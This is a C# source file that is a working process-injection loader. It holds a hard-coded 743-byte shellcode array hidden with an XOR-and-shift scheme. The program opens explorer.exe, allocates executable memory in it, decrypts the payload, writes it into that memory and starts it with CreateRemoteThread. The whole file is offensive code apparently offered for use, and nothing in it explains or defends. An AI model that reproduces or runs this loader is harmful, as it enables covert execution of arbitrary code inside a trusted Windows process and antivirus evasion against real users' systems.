using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Process_Injection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            byte[] encBytes = new byte[743] {
            0x67, 0x2b, 0xec, 0x4f, 0x53, 0x4b, 0xb7, 0x63, 0x63, 0x63, 0x22, 0x32, 0x22, 0x33, 0x3d,
            0x32, 0x39, 0x2b, 0x12, 0xbd, 0xce, 0x2b, 0xf4, 0x3d, 0xc3, 0x2b, 0xf4, 0x3d, 0x7b, 0x2b,
            0xf4, 0x3d, 0x03, 0x36, 0x12, 0xaa, 0x2b, 0xf4, 0xdd, 0x33, 0x2b, 0x70, 0x98, 0x35, 0x35,
            0x2b, 0x12, 0xa3, 0x97, 0x27, 0xc2, 0xe7, 0x6d, 0x17, 0x03, 0x22, 0xa2, 0xaa, 0x76, 0x22,
            0x62, 0xa2, 0x4d, 0x56, 0x3d, 0x22, 0x32, 0x2b, 0xf4, 0x3d, 0x03, 0xf4, 0x2d, 0x27, 0x2b,
            0x62, 0xb3, 0xc9, 0xe2, 0xdb, 0x7b, 0x74, 0x6d, 0x70, 0xee, 0xdd, 0x63, 0x63, 0x63, 0xf4,
            0xe3, 0xeb, 0x63, 0x63, 0x63, 0x2b, 0xee, 0xa3, 0xdf, 0xc8, 0x2b, 0x62, 0xb3, 0xf4, 0x2b,
            0x7b, 0x2f, 0xf4, 0x23, 0x03, 0x2a, 0x62, 0xb3, 0x33, 0x4c, 0x39, 0x2b, 0x60, 0xaa, 0x36,
            0x12, 0xaa, 0x22, 0xf4, 0x1f, 0xeb, 0x2b, 0x62, 0xb9, 0x2b, 0x12, 0xa3, 0x22, 0xa2, 0xaa,
            0x76, 0x97, 0x22, 0x62, 0xa2, 0x1b, 0x43, 0xde, 0x52, 0x37, 0x6c, 0x37, 0x0f, 0x6b, 0x2e,
            0x1a, 0xb2, 0xde, 0xbb, 0x3b, 0x2f, 0xf4, 0x23, 0x0f, 0x2a, 0x62, 0xb3, 0xc9, 0x22, 0xf4,
            0x77, 0x2b, 0x2f, 0xf4, 0x23, 0x07, 0x2a, 0x62, 0xb3, 0x22, 0xf4, 0x6f, 0xeb, 0x22, 0x3b,
            0x22, 0x3b, 0x2b, 0x62, 0xb3, 0xc1, 0x3a, 0xc5, 0x22, 0x3b, 0x22, 0x3a, 0x22, 0xc5, 0x2b,
            0xec, 0x57, 0x03, 0x22, 0x3d, 0x60, 0x43, 0x3b, 0x22, 0x3a, 0xc5, 0x2b, 0xf4, 0x7d, 0x4a,
            0x34, 0x60, 0x60, 0x60, 0xc6, 0x2b, 0x12, 0x44, 0x3c, 0x2a, 0xa1, 0xd8, 0xca, 0xd1, 0xca,
            0xd1, 0xce, 0xdf, 0x63, 0x22, 0x39, 0x2b, 0xea, 0x42, 0x2a, 0xa8, 0xad, 0x37, 0xd8, 0x09,
            0x68, 0x60, 0xbe, 0x3c, 0x3c, 0x2b, 0xea, 0x42, 0x3c, 0xc5, 0x36, 0x12, 0xa3, 0x36, 0x12,
            0xaa, 0x3c, 0x3c, 0x2a, 0xa5, 0x25, 0x39, 0xda, 0x88, 0x63, 0x63, 0x63, 0x63, 0x60, 0xbe,
            0x4b, 0x70, 0x63, 0x63, 0x63, 0x12, 0x1a, 0x1d, 0x11, 0x12, 0x19, 0x1b, 0x11, 0x1f, 0x1e,
            0x11, 0x1d, 0x13, 0x1f, 0x63, 0xc5, 0x2b, 0xea, 0xa2, 0x2a, 0xa8, 0xa3, 0xa4, 0x62, 0x63,
            0x63, 0x36, 0x12, 0xaa, 0x3c, 0x3c, 0xd5, 0x6c, 0x3c, 0x2a, 0xa5, 0x38, 0xea, 0x80, 0xa9,
            0x63, 0x63, 0x63, 0x63, 0x60, 0xbe, 0x4b, 0xa7, 0x63, 0x63, 0x63, 0x10, 0xc9, 0x1e, 0xd4,
            0x36, 0xcf, 0xd4, 0xd6, 0xcd, 0x22, 0x1e, 0x33, 0xe5, 0x3a, 0xd9, 0x35, 0xc8, 0xd7, 0xc0,
            0xdf, 0x37, 0xc8, 0xc8, 0x36, 0x37, 0x1b, 0x3f, 0x2d, 0xd8, 0x16, 0x39, 0x35, 0x13, 0xe5,
            0xd0, 0xd2, 0x13, 0xdf, 0xc5, 0x39, 0x28, 0xdc, 0x2e, 0x3f, 0xd1, 0xc0, 0x1c, 0xde, 0xc5,
            0x38, 0x2f, 0xc5, 0x28, 0xdd, 0x1a, 0xc8, 0x35, 0x2f, 0x18, 0x33, 0xda, 0x3e, 0xde, 0x16,
            0x3a, 0x38, 0xd5, 0xcf, 0x3c, 0x2f, 0x2d, 0x12, 0x2f, 0x2b, 0x2e, 0xc8, 0x13, 0xc8, 0x31,
            0xd8, 0x13, 0x38, 0xc0, 0x1a, 0xda, 0xc9, 0x34, 0x2c, 0x2a, 0x33, 0xc5, 0x37, 0x3b, 0x1d,
            0xe5, 0x1d, 0x1b, 0xcf, 0xcd, 0xd5, 0x38, 0x35, 0x3e, 0xde, 0x2c, 0x19, 0xc8, 0x32, 0x22,
            0xe5, 0xd3, 0x2d, 0xd7, 0xc0, 0xc2, 0x2a, 0x16, 0x3a, 0x3b, 0x2c, 0xd6, 0x1d, 0x33, 0x3a,
            0x1e, 0x3d, 0x2f, 0xda, 0x3c, 0xc5, 0xcb, 0x3f, 0x30, 0xdb, 0xdb, 0xde, 0xcc, 0xc8, 0x3a,
            0x16, 0x1b, 0x3d, 0x28, 0x3d, 0x1b, 0x1f, 0x1d, 0x3e, 0xd7, 0x19, 0x39, 0x1b, 0x38, 0x3f,
            0xdc, 0x1d, 0xcd, 0x2d, 0x2a, 0x2d, 0xdb, 0x35, 0xd9, 0xde, 0xd9, 0x3c, 0x31, 0xd6, 0xda,
            0xd1, 0x29, 0xda, 0x3d, 0x2f, 0x19, 0x1c, 0xd0, 0xd1, 0x19, 0xd7, 0xcc, 0xd9, 0xde, 0x3d,
            0x3e, 0x3c, 0x3e, 0x63, 0x2b, 0xea, 0xa2, 0x3c, 0xc5, 0x22, 0x3b, 0x36, 0x12, 0xaa, 0x3c,
            0x2b, 0x9b, 0x63, 0x1d, 0x8b, 0xef, 0x63, 0x63, 0x63, 0x63, 0x33, 0x3c, 0x3c, 0x2a, 0xa8,
            0xad, 0x54, 0x3e, 0x11, 0x24, 0x60, 0xbe, 0x2b, 0xea, 0xa9, 0xd5, 0x75, 0xc0, 0x2b, 0xea,
            0x52, 0xd5, 0x00, 0xc5, 0x3d, 0xcb, 0xe3, 0x1c, 0x63, 0x63, 0x2a, 0xea, 0x43, 0xd5, 0x6f,
            0x22, 0x3a, 0x2a, 0xa5, 0xde, 0x29, 0x81, 0xe9, 0x63, 0x63, 0x63, 0x63, 0x60, 0xbe, 0x36,
            0x12, 0xa3, 0x3c, 0xc5, 0x2b, 0xea, 0x52, 0x36, 0x12, 0xaa, 0x36, 0x12, 0xaa, 0x3c, 0x3c,
            0x2a, 0xa8, 0xad, 0x16, 0x69, 0x7b, 0xe4, 0x60, 0xbe, 0xee, 0xa3, 0xde, 0x00, 0x2b, 0xa8,
            0xa2, 0xeb, 0x7c, 0x63, 0x63, 0x2a, 0xa5, 0x2f, 0x53, 0x1e, 0x43, 0x63, 0x63, 0x63, 0x63,
            0x60, 0xbe, 0x2b, 0x60, 0xb0, 0xdf, 0x6d, 0x54, 0x95, 0x4b, 0x3e, 0x63, 0x63, 0x63, 0x3c,
            0x3a, 0xd5, 0x23, 0xc5, 0x2a, 0xea, 0xb2, 0xa2, 0x4d, 0x73, 0x2a, 0xa8, 0xa3, 0x63, 0x73,
            0x63, 0x63, 0x2a, 0xa5, 0x3b, 0x8f, 0x3c, 0x4e, 0x63, 0x63, 0x63, 0x63, 0x60, 0xbe, 0x2b,
            0xfc, 0x3c, 0x3c, 0x2b, 0xea, 0x48, 0x2b, 0xea, 0x52, 0x2b, 0xea, 0x45, 0x2a, 0xa8, 0xa3,
            0x63, 0x03, 0x63, 0x63, 0x2a, 0xea, 0x5a, 0x2a, 0xa5, 0x7d, 0xf9, 0xea, 0x4d, 0x63, 0x63,
            0x63, 0x63, 0x60, 0xbe, 0x2b, 0xec, 0xaf, 0x03, 0xee, 0xa3, 0xdf, 0x9d, 0xc9, 0xf4, 0x68,
            0x2b, 0x62, 0xac, 0xee, 0xa3, 0xde, 0xbd, 0x3b, 0xac, 0x3b, 0xd5, 0x63, 0x3a, 0xa4, 0x43,
            0x06, 0x15, 0x75, 0x22, 0xea, 0x45, 0x60, 0xbe };

            // XOR Key
            byte[] xKey = BitConverter.GetBytes(0xc5);

            // Shift Key
            int sKey = 166;

            // Decrypt XOR then shift to the left (-) as long as it's the opposite of what you shifted to start
            byte[] decBytes = new byte[encBytes.Length];
            for (int i = 0; i < encBytes.Length; i++)
            {
                decBytes[i] = (byte)((((uint)encBytes[i] ^ xKey[0]) - sKey) & 0xFF);
            }

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, decBytes, decBytes.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}